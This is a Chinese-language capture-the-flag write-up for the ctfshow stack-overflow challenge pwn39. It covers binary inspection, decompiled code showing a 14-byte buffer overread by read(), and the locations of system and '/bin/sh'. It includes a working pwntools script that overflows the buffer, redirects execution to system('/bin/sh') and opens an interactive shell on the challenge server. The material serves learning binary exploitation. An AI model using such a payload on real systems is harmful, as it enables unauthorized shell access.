```
tasike@tasike-VM:~/Desktop$ chmod 777 pwn39
```

```
tasike@tasike-VM:~/Desktop$ file pwn39
pwn39: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=ed2ae81287a176fcf37eb26d4b8b706a15698fd8, not stripped
```

```
tasike@tasike-VM:~/Desktop$ checksec pwn39
[*] '/home/tasike/Desktop/pwn39'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

堆栈不可执行

`ida`查看：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  puts(asc_804876C);
  puts(asc_80487E0);
  puts(asc_804885C);
  puts(asc_80488E8);
  puts(asc_8048978);
  puts(asc_80489FC);
  puts(asc_8048A90);
  puts("    * *************************************                           ");
  puts(aClassifyCtfsho);
  puts("    * Type  : Stack_Overflow                                          ");
  puts("    * Site  : https://ctf.show/                                       ");
  puts("    * Hint  : It has system and '/bin/sh',but they don't work together");
  puts("    * *************************************                           ");
  puts("Just easy ret2text&&32bit");
  ctfshow();
  puts("\nExit");
  return 0;
}
```

`ctfshow`函数：

```c
ssize_t ctfshow()
{
  char buf[14]; // [esp+6h] [ebp-12h] BYREF

  return read(0, buf, 0x32u);
}
```

`buf`与`ebp`距离为`0x12`

没有发现后门函数，但是发现`_system`函数：
```c
// attributes: thunk
int system(const char *command)
{
  return system(command);
}
```

`Fn +  Shift + F12`查看字符串：

```
.rodata:08048750	00000008	C	/bin/sh
```

编写`attack39.py`

```python
from pwn import *
context(os = 'Linux', arch = 'i386', log_level = 'debug')
r = remote('pwn.challenge.ctf.show', 28242)
system = 0x080483A0
binsh = 0x08048750
payload = cyclic(0x12 + 0x4) + p32(system) + p32(0) + p32(binsh)
r.sendline(payload)
r.interactive()
```

> 参数顺序
> 32位中先写函数，再写参数【参数可能是返回值，如调用system，需要多加个参数作返回值】【8月10日更改，做了这么多题，发现32bit的payload中，最后一个函数都需要有返回值】【8月12日补充，又做一些题，进一步明白，每个函数都有返回值，而我们对函数返回值不感兴趣【比如一些函数执行成功会返回1】只需要有个位置充当一下，而之前对于多个函数的解释也进一步得以优化，其应该是需要返回值的，只不过位置正好被其他的东西给占据了，如pop_这些用于给参数位置的rop链给一举两得给占据了，也就是说，即使是最后一个函数有参数，也不用在单独写一个p32(0)来填充返回值的位置，因为pop_已经将这件事给做了 ，例如payload = cyclic(0x2c + 4) + p32(func1) + p32(func2) + p32(pop_ebx) + p32(0xACACACAC) + p32(flag) + p32(pop_ebx) + p32(0xBDBDBDBD)

